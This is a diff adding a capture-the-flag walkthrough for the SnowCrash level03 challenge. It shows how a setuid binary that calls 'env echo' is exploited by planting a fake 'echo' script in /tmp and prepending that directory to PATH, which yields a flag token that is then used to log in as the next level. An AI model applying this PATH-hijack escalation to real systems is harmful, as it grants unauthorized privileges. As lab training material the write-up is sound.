@@ -1,0 +1,35 @@
+level03@SnowCrash:~$ ls -l
+total 4
+-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
+level03@SnowCrash:~$ ./level03 
+Exploit me
+level03@SnowCrash:~$ 
+
+level03@SnowCrash:~$ strings level03 | grep "Exploit me"
+/usr/bin/env echo Exploit me
+level03@SnowCrash:~$ 
+
+
+
+Binary use '/usr/bin/env echo' to print 'Exploit me', so we'll exploit it as suggested
+
+
+
+level03@SnowCrash:~$ echo '/bin/getflag > /tmp/flag03' > /tmp/echo
+level03@SnowCrash:~$ chmod +x /tmp/echo
+level03@SnowCrash:~$ export PATH=/tmp:$PATH
+
+
+
+Re-execute level03
+
+
+
+level03@SnowCrash:~$ ./level03 
+level03@SnowCrash:~$ cat /tmp/flag03
+Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
+level03@SnowCrash:~$ 
+
+level03@SnowCrash:~$ su level04
+Password: qi0maab88jeaj46qoumi7maus
+level04@SnowCrash:~$ 
